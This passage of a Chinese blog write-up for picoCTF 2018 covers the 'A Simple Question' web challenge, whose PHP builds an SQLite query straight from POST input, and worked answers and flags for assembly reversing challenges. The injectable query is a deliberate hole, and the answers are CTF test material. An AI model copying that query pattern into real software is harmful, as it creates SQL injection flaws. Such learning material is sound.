md5(key.encode(<span class="string">'utf8'</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(self, raw)</span>:</span></span><br><span class="line">        raw = pad(raw)</span><br><span class="line">        iv = Random.new().read(AES.block_size)</span><br><span class="line">        cipher = AES.new(self.key, AES.MODE_CBC, iv)</span><br><span class="line">        <span class="keyword">return</span> b64encode(iv + cipher.encrypt(raw))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(self, enc)</span>:</span></span><br><span class="line">        enc = b64decode(enc)</span><br><span class="line">        iv = enc[:<span class="number">16</span>]</span><br><span class="line">        cipher = AES.new(self.key, AES.MODE_CBC, iv)</span><br><span class="line">        <span class="keyword">return</span> unpad(cipher.decrypt(enc[<span class="number">16</span>:])).decode(<span class="string">'utf8'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
+<h2 id="【X】A-Simple-Question"><a href="#【X】A-Simple-Question" class="headerlink" title="【X】A Simple Question"></a>【X】A Simple Question</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  include &quot;config.php&quot;;</span><br><span class="line">  ini_set(&apos;error_reporting&apos;, E_ALL);</span><br><span class="line">  ini_set(&apos;display_errors&apos;, &apos;On&apos;);</span><br><span class="line"></span><br><span class="line">  $answer = $_POST[&quot;answer&quot;];</span><br><span class="line">  $debug = $_POST[&quot;debug&quot;];</span><br><span class="line">  $query = &quot;SELECT * FROM answers WHERE answer=&apos;$answer&apos;&quot;;</span><br><span class="line">  echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">  echo &quot;SQL query: &quot;, htmlspecialchars($query), &quot;\n&quot;;</span><br><span class="line">  echo &quot;&lt;/pre&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">  $con = new SQLite3($database_file);</span><br><span class="line">  $result = $con-&gt;query($query);</span><br><span class="line"></span><br><span class="line">  $row = $result-&gt;fetchArray();</span><br><span class="line">  if($answer == $CANARY)  &#123;</span><br><span class="line">    echo &quot;&lt;h1&gt;Perfect!&lt;/h1&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;p&gt;Your flag is: $FLAG&lt;/p&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  elseif ($row) &#123;</span><br><span class="line">    echo &quot;&lt;h1&gt;You are so close.&lt;/h1&gt;&quot;;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    echo &quot;&lt;h1&gt;Wrong.&lt;/h1&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h1 id="reversing"><a href="#reversing" class="headerlink" title="reversing"></a>reversing</h1><h2 id="assembly-0"><a href="#assembly-0" class="headerlink" title="assembly-0"></a>assembly-0</h2><p>What does asm0(0xd8,0x7a) return? 0x7a。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.bits 32</span><br><span class="line">	</span><br><span class="line">.global asm0</span><br><span class="line"></span><br><span class="line">asm0:</span><br><span class="line">	push	ebp</span><br><span class="line">	mov	ebp,esp</span><br><span class="line">	mov	eax,DWORD PTR [ebp+0x8]</span><br><span class="line">	mov	ebx,DWORD PTR [ebp+0xc]</span><br><span class="line">	mov	eax,ebx</span><br><span class="line">	mov	esp,ebp</span><br><span class="line">	pop	ebp	</span><br><span class="line">	ret</span><br></pre></td></tr></table></figure>
+<h2 id="assembly-1"><a href="#assembly-1" class="headerlink" title="assembly-1"></a>assembly-1</h2><p>What does asm1(0xcd) return? 0xca。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.bits 32</span><br><span class="line">	</span><br><span class="line">.global asm1</span><br><span class="line"></span><br><span class="line">asm1:</span><br><span class="line">	push	ebp</span><br><span class="line">	mov	ebp,esp</span><br><span class="line">	cmp	DWORD PTR [ebp+0x8],0xde</span><br><span class="line">	jg 	part_a	</span><br><span class="line">	cmp	DWORD PTR [ebp+0x8],0x8</span><br><span class="line">	jne	part_b</span><br><span class="line">	mov	eax,DWORD PTR [ebp+0x8]</span><br><span class="line">	add	eax,0x3</span><br><span class="line">	jmp	part_d</span><br><span class="line">part_a:</span><br><span class="line">	cmp	DWORD PTR [ebp+0x8],0x4e</span><br><span class="line">	jne	part_c</span><br><span class="line">	mov	eax,DWORD PTR [ebp+0x8]</span><br><span class="line">	sub	eax,0x3</span><br><span class="line">	jmp	part_d</span><br><span class="line">part_b:</span><br><span class="line">	mov	eax,DWORD PTR [ebp+0x8]</span><br><span class="line">	sub	eax,0x3</span><br><span class="line">	jmp	part_d</span><br><span class="line">	cmp	DWORD PTR [ebp+0x8],0xee</span><br><span class="line">	jne	part_c</span><br><span class="line">	mov	eax,DWORD PTR [ebp+0x8]</span><br><span class="line">	sub	eax,0x3</span><br><span class="line">	jmp	part_d</span><br><span class="line">part_c:</span><br><span class="line">	mov	eax,DWORD PTR [ebp+0x8]</span><br><span class="line">	add	eax,0x3</span><br><span class="line">part_d:</span><br><span class="line">	pop	ebp</span><br><span class="line">	ret</span><br></pre></td></tr></table></figure>
+<h2 id="assembly-2"><a href="#assembly-2" class="headerlink" title="assembly-2"></a>assembly-2</h2><p>What does asm2(0x7,0x28) return?   <code>hex(int((0xa1df-0x7)/float(0x76))+1+0x28)</code> =&gt; 0x188</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.bits 32</span><br><span class="line">	</span><br><span class="line">.global asm2</span><br><span class="line"></span><br><span class="line">asm2:</span><br><span class="line">	push   	ebp</span><br><span class="line">	mov    	ebp,esp</span><br><span class="line">	sub    	esp,0x10</span><br><span class="line">	mov    	eax,DWORD PTR [ebp+0xc]</span><br><span class="line">	mov 	DWORD PTR [ebp-0x4],eax</span><br><span class="line">	mov    	eax,DWORD PTR [ebp+0x8]</span><br><span class="line">	mov	DWORD PTR [ebp-0x8],eax</span><br><span class="line">	jmp    	part_b</span><br><span class="line">part_a:	</span><br><span class="line">	add    	DWORD PTR [ebp-0x4],0x1</span><br><span class="line">	add	DWORD PTR [ebp+0x8],0x76</span><br><span class="line">part_b:	</span><br><span class="line">	cmp    	DWORD PTR [ebp+0x8],0xa1de</span><br><span class="line">	jle    	part_a</span><br><span class="line">	mov    	eax,DWORD PTR [ebp-0x4]</span><br><span class="line">	mov	esp,ebp</span><br><span class="line">	pop	ebp</span><br><span class="line">	ret</span><br></pre></td></tr></table></figure>
+<h2 id="assembly-3"><a href="#assembly-3" class="headerlink" title="assembly-3"></a>assembly-3</h2><p>What does asm3(0xbda42100,0xb98dd6a5,0xecded223) return?  0x478</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ebp+0x8=&gt;0xbda42100</span><br><span class="line">ebp+0xc=&gt;0xb98dd6a5</span><br><span class="line">ebp+0x10=&gt;0xecded223</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.bits 32</span><br><span class="line"></span><br><span class="line">.global asm3</span><br><span class="line"></span><br><span class="line">asm3:</span><br><span class="line">        push    ebp</span><br><span class="line">        mov     ebp,esp</span><br><span class="line">        mov     eax,0xbc;0xbc</span><br><span class="line">        xor     al,al;0x00</span><br><span class="line">        mov     ah,BYTE PTR [ebp+0x9];0x2100</span><br><span class="line">        sal     ax,0x10;0x0000</span><br><span class="line">        sub     al,BYTE PTR [ebp+0xc];0x005b</span><br><span class="line">        add     ah,BYTE PTR [ebp+0xd];0xd65b</span><br><span class="line">        xor     ax,WORD PTR [ebp+0x10];0xd65b^0xd223=0x478</span><br><span class="line">        mov     esp, ebp</span><br><span class="line">        pop     ebp</span><br><span class="line">        ret</span><br></pre></td></tr></table></figure>
+<p>有几点需要注意。一是数据采用小端序存储，高字节在高地址，[ebp+0x8]的值是0x00而非0xbd；二是 <code>sub 0x00,0xa5</code> 的值是<code>0x100-0xa5=0x5b</code> 。 三是<code>WORD PTR [ebp+0x10]</code> 的值是<code>0xd223</code> 而非<code>0x23d2</code> 。</p>
+<p><img src="1541310455800.png" alt="1541310455800"></p>
+<p>可参考 <a href="https://github.com/xnand/ctf_writeups/blob/master/picoCTF2018/assembly-0-1-2-3-4/README.md" target="_blank" rel="noopener">此处</a> 将汇编代码编译成共享库在C程序中调用。执行得到结果，也可调试加深理解。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br><span class="line">global asm3</span><br><span class="line"></span><br><span class="line">asm3:</span><br><span class="line">	push   	ebp</span><br><span class="line">	mov    	ebp,esp</span><br><span class="line">	mov	eax,0x19</span><br><span class="line">	xor	al,al</span><br><span class="line">	mov	ah,BYTE [ebp+0xa]</span><br><span class="line">	sal	ax,0x10</span><br><span class="line">	sub	al,BYTE [ebp+0xd]</span><br><span class="line">	add	ah,BYTE [ebp+0xc]</span><br><span class="line">	xor	ax,WORD [ebp+0x12]</span><br><span class="line">	mov	esp, ebp</span><br><span class="line">	pop	ebp</span><br><span class="line">	ret</span><br><span class="line">##################</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">extern int asm3(int a, int b, int c);</span><br><span class="line"></span><br><span class="line">int main(void) &#123;</span><br><span class="line"></span><br><span class="line">	printf(&quot;0x%x\n&quot;, asm3(0xb5e8e971,0xc6b58a95,0xe20737e9));</span><br><span class="line"></span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br><span class="line">##################</span><br><span class="line">[andrei@jacky 15:27:00] ~/Documents/pico/3</span><br><span class="line">——&gt; nasm -f elf32 end_asm_rev.S -o asmfun.o</span><br><span class="line">[andrei@jacky 15:27:42] ~/Documents/pico/3</span><br><span class="line">——&gt; gcc sol.c asmfun.o -o sol -m32</span><br><span class="line">[andrei@jacky 15:27:59] ~/Documents/pico/3</span><br><span class="line">——&gt; ./sol</span><br></pre></td></tr></table></figure>
+<h2 id="assembly-4"><a href="#assembly-4" class="headerlink" title="assembly-4"></a>assembly-4</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/ctf/pico18<span class="comment"># nasm -f elf32 comp.nasm -o comp.o</span></span><br><span class="line">root@kali:~/ctf/pico18<span class="comment"># gcc -m32 -o comp comp.o</span></span><br><span class="line">root@kali:~/ctf/pico18<span class="comment"># ./comp</span></span><br><span class="line">picoCTF&#123;1_h0p3_y0u_c0mP1l3d_tH15_32429699163</span><br></pre></td></tr></table></figure>
+<p><code>picoCTF{1_h0p3_y0u_c0mP1l3d_tH15_3242969916}</code> </p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/180920-heidunbei/" rel="next" title="福建省黑盾杯解题报告">
+                <i class="fa fa-chevron-left"></i> 福建省黑盾杯解题报告
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/181013-huwangbei-writeup/" rel="prev" title="护网杯解题记录">
+                护网杯解题记录 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+      <div id="sidebar-dimmer"></div>
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">findneo</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">73</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/findneo" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i></a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="javascript:alert(atob('ZGZpbmRuZW9AZ21haWwuY29t'))" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i></a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://twitter.com/findne0" target="_blank" title="Twitter">
+                      
+                        <i class="fa fa-fw fa-twitter"></i></a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://chybeta.github.io/" title="Chybeta" target="_blank">Chybeta</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ctftime.org/event/list/upcoming" title="CTFtime" target="_blank">CTFtime</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ginove.github.io/" title="Ginove" target="_blank">Ginove</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://lm0963.github.io/" title="Lm0963" target="_blank">Lm0963</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.lzhtony.com" title="lzhtony" target="_blank">lzhtony</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://madsome.one/" title="Mads" target="_blank">Mads</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ph0en1x.com/" title="Ph0en1x-Team" target="_blank">Ph0en1x-Team</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://vancir.com/" title="Vancir" target="_blank">Vancir</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Forensics"><span class="nav-number">1.</span> <span class="nav-text">Forensics</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Forensics-Warmup-1"><span class="nav-number">1.1.</span> <span class="nav-text">Forensics Warmup 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Forensics-Warmup-2"><span class="nav-number">1.2.</span> <span class="nav-text">Forensics Warmup 2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Desrouleaux"><span class="nav-number">1.3.</span> <span class="nav-text">Desrouleaux</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reading-Between-the-Eyes"><span class="nav-number">1.4.</span> <span class="nav-text">Reading Between the Eyes</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Recovering-From-the-Snap"><span class="nav-number">1.5.</span> <span class="nav-text">Recovering From the Snap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#admin-panel"><span class="nav-number">1.6.</span> <span class="nav-text">admin panel</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hex-editor"><span class="nav-number">1.7.</span> <span class="nav-text">hex editor</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Truly-an-Artist"><span class="nav-number">1.8.</span> <span class="nav-text">Truly an Artist</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#now-you-don’t"><span class="nav-number">1.9.</span> <span class="nav-text">now you don’t</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Ext-Super-Magic"><span class="nav-number">1.10.</span> <span class="nav-text">Ext Super Magic</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Lying-Out"><span class="nav-number">1.11.</span> <span class="nav-text">Lying Out</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#What’s-My-Name"><span class="nav-number">1.12.</span> <span class="nav-text">What’s My Name?</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Malware-Shops"><span class="nav-number">1.13.</span> <span class="nav-text">Malware Shops</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LoadSomeBits"><span class="nav-number">1.14.</span> <span class="nav-text">LoadSomeBits</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#core"><span class="nav-number">1.15.</span> <span class="nav-text">core</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#General-Skills"><span class="nav-number">2.</span> <span class="nav-text">General Skills</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#absolutely-relative"><span class="nav-number">2.1.</span> <span class="nav-text">absolutely relative</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Aca-Shell-A"><span class="nav-number">2.2.</span> <span class="nav-text">Aca-Shell-A</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#in-out-error"><span class="nav-number">2.3.</span> <span class="nav-text">in out error</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#learn-gdb"><span class="nav-number">2.4.</span> <span class="nav-text">learn gdb</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#store"><span class="nav-number">2.5.</span> <span class="nav-text">store</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#roulette"><span class="nav-number">2.6.</span> <span class="nav-text">roulette</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#scriptme"><span class="nav-number">2.7.</span> <span class="nav-text">scriptme</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#binary-exploitation"><span class="nav-number">3.</span> <span class="nav-text">binary exploitation</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#buffer-overflow-0"><span class="nav-number">3.1.</span> <span class="nav-text">buffer overflow 0</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Cryptography"><span class="nav-number">4.</span> <span class="nav-text">Cryptography</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Crypto-Warmup-1"><span class="nav-number">4.1.</span> <span class="nav-text">Crypto Warmup 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#caesar-cipher-2"><span class="nav-number">4.2.</span> <span class="nav-text">caesar cipher 2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hertz"><span class="nav-number">4.3.</span> <span class="nav-text">hertz</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#blaise’s-cipher"><span class="nav-number">4.4.</span> <span class="nav-text">blaise’s cipher</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Safe-RSA"><span class="nav-number">4.5.</span> <span class="nav-text">Safe RSA</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#【X】Super-Safe-RSA"><span class="nav-number">4.6.</span> <span class="nav-text">【X】Super Safe RSA</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HEEEEEEERE’S-Johnny"><span class="nav-number">4.7.</span> <span class="nav-text">HEEEEEEERE’S Johnny!</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#rsa-madlibs"><span class="nav-number">4.8.</span> <span class="nav-text">rsa-madlibs</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SpyFi"><span class="nav-number">4.9.</span> <span class="nav-text">SpyFi</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Web-Exploitation"><span class="nav-number">5.</span> <span class="nav-text">Web Exploitation</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Buttons"><span class="nav-number">5.1.</span> <span class="nav-text">Buttons</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Artisinal-Handcrafted-HTTP-3"><span class="nav-number">5.2.</span> <span class="nav-text">Artisinal Handcrafted HTTP 3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#【X】Secure-Logon"><span class="nav-number">5.3.</span> <span class="nav-text">【X】Secure Logon</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#【X】A-Simple-Question"><span class="nav-number">5.4.</span> <span class="nav-text">【X】A Simple Question</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#reversing"><span class="nav-number">6.</span> <span class="nav-text">reversing</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#assembly-0"><span class="nav-number">6.1.</span> <span class="nav-text">assembly-0</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#assembly-1"><span class="nav-number">6.2.</span> <span class="nav-text">assembly-1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#assembly-2"><span class="nav-number">6.3.</span> <span class="nav-text">assembly-2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#assembly-3"><span class="nav-number">6.4.</span> <span class="nav-text">assembly-3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#assembly-4"><span class="nav-number">6.5.</span> <span class="nav-text">assembly-4</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">findneo</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'https://findneo.github.io/180929-picoctf/';
+          this.page.identifier = '180929-picoctf/';
+          this.page.title = 'picoCTF-2018 解题报告';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://findneo.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
